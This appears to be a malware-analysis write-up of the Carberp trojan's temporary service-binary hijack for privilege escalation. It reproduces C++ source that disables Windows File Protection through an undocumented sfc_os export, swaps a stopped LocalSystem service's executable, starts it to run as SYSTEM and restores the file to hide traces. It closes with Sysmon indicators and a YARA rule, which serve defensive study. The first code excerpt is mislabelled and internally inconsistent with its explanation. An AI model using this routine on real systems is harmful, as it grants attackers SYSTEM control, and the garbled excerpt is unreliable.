# Carberp - Temporary Service Binary Hijacking for Privilege Escalation

**Repository:** MalwareSourceCode-main  
**File Path:** `Win32/Infector/Win32.Carberp/Win32.Carberp/Source/svc_fuckup.cpp`  
**Language:** C++  
**MITRE ATT&CK:** T1574.010 - Hijack Execution Flow: Services File Permissions Weakness

---

## Overview

The Carberp banking trojan implements a sophisticated, temporary service hijacking technique for privilege escalation, internally referred to as "svc_fuckup". Instead of creating a new, permanent service, Carberp finds an existing, legitimate Windows service that is currently stopped and configured to run as `LocalSystem`. It then bypasses Windows File Protection (WFP) by calling an undocumented API, renames the legitimate service's executable, and replaces it with its own. The malware then starts the service, causing the Service Control Manager (SCM) to execute the malware's code with SYSTEM privileges. Immediately after execution, it restores the original service binary, leaving the service's configuration unmodified and creating a very narrow window for detection.

---

## Code Snippet 1: Bypassing Windows File Protection and Replacing the Service Binary

```cpp
bool TryToFuckup(SC_HANDLE hSCManager,TCHAR *lpService)
{
	bool bRet=false;
	
	// STEP 1: Load Windows File Protection (WFP) bypass functions
	HMODULE hSfc=LoadLibrary(TEXT("sfc_os"));
	SfcIsFileProtected=(_SfcIsFileProtected*)GetProcAddress(hSfc,"SfcIsFileProtected");
	SfcFileException=(_SfcFileException *)GetProcAddress(hSfc,(LPCSTR)5);  // Undocumented ordinal #5
	
	// STEP 2: Open Service Control Manager
	SC_HANDLE hSCManager=OpenSCManager(NULL,SERVICES_ACTIVE_DATABASE,SC_MANAGER_ENUMERATE_SERVICE);
	BOOL bSuccess=FALSE;
	
	PP_DPRINTF(L"FuckupSvc: init result sfc_handle=0x%X F1=0x%X F2=0x%X svc_man=0x%X",
		hSfc,
		SfcIsFileProtected,
		SfcFileException,
		hSCManager
		);

	do
	{
		DWORD dwBytesNeeded=0,dwServicesReturned=0,dwResumeHandle=0;
		ENUM_SERVICE_STATUS_PROCESS services[200];
		
		// STEP 3: Enumerate all Windows services (running + stopped)
		bSuccess=EnumServicesStatusEx(
		    hSCManager,
		    SC_ENUM_PROCESS_INFO,
		    SERVICE_WIN32,          // All Win32 services (not drivers)
		    SERVICE_STATE_ALL,      // Both running and stopped
		    LPBYTE(services),
		    sizeof(services),
		    &dwBytesNeeded,
		    &dwServicesReturned,
		    &dwResumeHandle,
		    NULL
		);

		// STEP 4: Iterate through services, test each for hijackability
		for (DWORD n=0; n < dwServicesReturned; n++)
		{
			if (services[n].ServiceStatusProcess.dwCurrentState == SERVICE_STOPPED)
			{
				// Service is stopped - attempt hijack
				PP_DPRINTF(L"FuckupSvc: service '%S' is stopped. Try to use it.",
					services[n].lpServiceName);
				
				if (TryToFuckup(hSCManager, services[n].lpServiceName))
				{
					// SUCCESS - Malicious code executed, cleanup complete
					bRet = true;
					PP_DPRINTF(L"FuckupSvc: service '%S' successfuly used.",
						services[n].lpServiceName);
					break;  // Exit after first successful hijack
				}
			}
		}
	} while (bSuccess && !bRet);  // Continue until success or no more services
	
	CloseServiceHandle(hSCManager);
	return bRet;
}
```

**What it does:**  
This code block targets a legitimate, stopped service running as `LocalSystem`. It first checks if the service's executable is protected by Windows File Protection (WFP). If it is, the code calls `SfcFileException`, an undocumented function exported by `sfc_os.dll` at ordinal #5, to add a temporary exception for the file. With protection disabled, it renames the original executable by appending an underscore (`_`) and then copies its own executable to the legitimate service's path.

**Why it's T1574.010:**  
This is a direct implementation of service binary hijacking. The malware exploits its ability to modify the file associated with a Windows service. By replacing the legitimate binary with its own, it ensures that when the service is next started, the malware's code will be executed instead of the legitimate code, inheriting the high-privilege context of the `LocalSystem` account.

---

## Code Snippet 2: Starting the Hijacked Service and Restoring the Original Binary

```cpp
				// ... (File has been replaced) ...
				if (CopyFile(szSelfName,szFileNameWithPathOny,TRUE))
				{
					PP_DPRINTF(L"TryToFuckup: File replaced. Starting service.");
					
					HANDLE success_event = CreateSvcFuckupEvent();
					// STEP 5: Start the service, which now points to the malware
					StartService(hService,0,NULL);

					// Wait for the malware's service code to signal it has run
					bRet = (WaitForSingleObject(success_event, 5 * 1000) == WAIT_OBJECT_0);

					if (bRet)
					{
						// Wait for the service to stop itself
						while (true)
						{
							SERVICE_STATUS ssStatus;
							QueryServiceStatus(hService,&ssStatus);
							if (ssStatus.dwCurrentState == SERVICE_STOPPED)
								break;
							Sleep(1);
						}
					}
					PP_DPRINTF(L"TryToFuckup: Original file restoring...");
					// STEP 6: Delete the malware executable
					while (!DeleteFile(szFileNameWithPathOny)) Sleep(1);
				}
				// STEP 7: Rename the original service binary back to its proper name
				MoveFile(szTmpName,szFileNameWithPathOny);

				PP_DPRINTF(L"TryToFuckup: Original file restored.");
			}
		}
	}
	// ... (Close handles) ...
	return bRet;
}
```

**What it does:**  
After successfully replacing the binary, the code calls `StartService`. The Service Control Manager, unaware of the swap, reads the service's configured binary path and executes the malware with `LocalSystem` privileges. The malware is designed to run quickly and then signal its completion via an event. The `TryToFuckup` function waits for this signal, then waits for the service to enter the `SERVICE_STOPPED` state. Finally, it cleans up by deleting its own file from the service's path and renaming the original executable back, leaving no trace of the hijack on the file system.

**Why it's T1574.010:**  
This completes the hijack execution flow. The call to `StartService` is the trigger that causes the operating system to execute the malicious payload. The immediate restoration of the original binary is a key evasion tactic, as it minimizes the time-to-detect and removes the primary forensic artifact (the replaced file) almost instantly, leaving only event logs as evidence of the compromise.

---

## Detection & Evasion

### Sysmon Telemetry

This technique produces a rapid sequence of correlated events that are highly suspicious.

- **Event ID 1: ProcessCreate**: A process loads `sfc_os.dll` and calls an unnamed export (ordinal #5).
- **Event ID 11: FileCreate**: A legitimate service executable (e.g., `C:\Windows\System32\legitservice.exe`) is renamed to `legitservice.exe_`.
- **Event ID 11: FileCreate**: A new `legitservice.exe` is created by the malware process.
- **Event ID 1: ProcessCreate**: The newly created `legitservice.exe` (which is actually the malware) is started with `LocalSystem` privileges. The parent process will be `services.exe`.
- **Event ID 23: FileDelete**: `legitservice.exe` is deleted.
- **Event ID 11: FileCreate**: `legitservice.exe_` is renamed back to `legitservice.exe`.

Correlating this sequence of file operations (`rename`, `create`, `delete`, `rename`) on a single service binary within a short timeframe is a high-fidelity indicator of this attack.

### YARA Rule

```yara
rule T1574_Hijack_Carberp_SvcFuckup
{
    meta:
        author = "Vengful"
        description = "Detects strings related to the Carberp 'svc_fuckup' temporary service binary replacement routine."
        reference = "Internal Research"
        date = "2025-11-25"
        mitre_attack = "T1574.010"

    strings:
        // Module name
        $s1 = "svc_fuckup.cpp" ascii

        // Undocumented WFP bypass function
        $s2 = "sfc_os" wide
        $s3 = "SfcFileException" ascii
        
        // Key function names and strings
        $s4 = "TryToFuckup" ascii
        $s5 = "SvcFuckupRun" ascii
        $s6 = "LocalSystem" wide
        $s7 = "FuckupSvc: init result" wide

    condition:
        uint16(0) == 0x5A4D and // MZ header
        $s1 and all of ($s2,$s3,$s6,$s7) and 1 of ($s4,$s5)
}
```
